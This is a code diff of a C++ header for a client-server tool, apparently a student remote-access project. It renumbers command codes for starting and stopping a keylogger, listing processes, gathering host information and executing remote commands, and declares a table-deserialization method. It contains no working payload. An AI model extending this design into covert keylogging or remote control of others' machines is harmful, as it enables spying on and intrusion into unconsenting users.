@@ -8,22 +8,23 @@
 #include <vector>
 #include <conio.h>
 #include <iostream>
+#include <iomanip>
 
 using namespace std;
 
 // Command types for the client-server communication
 enum class CommandType : uint8_t
 {
-    HOST_INFO_REQUEST = 0x01,
+    SEND_MESSAGE = 0x01,
     START_KEYLOGGER_REQUEST = 0x02,
     STOP_KEYLOGGER_REQUEST = 0x03,
     LIST_PROCESSES_REQUEST = 0x04,
-    EXECUTE_COMMAND_REQUEST = 0x05,
-    SEND_MESSAGE = 0x07,
+    HOST_INFO_REQUEST = 0x05,
+    EXECUTE_COMMAND_REQUEST = 0x06,
     // Response types
     HOST_INFO_RESPONSE = 0x81,
     KEY_LOG_DATA_RESPONSE = 0x82,
-    PROCESS_LIST_RESPONSE = 0x84,
+    LIST_PROCESSES_RESPONSE = 0x84,
     COMMAND_RESULT_RESPONSE = 0x85
 };
 
@@ -67,5 +68,8 @@ private:
 
     // Handles commands received from the client
     void handleCommand(const LPTF_Packet &packet);
+
+    // Deserializes a vector of uint8_t into a table of strings 
+    vector<vector<string>> deserializeStringTable(const vector<uint8_t>& payload);
 };
 #endif
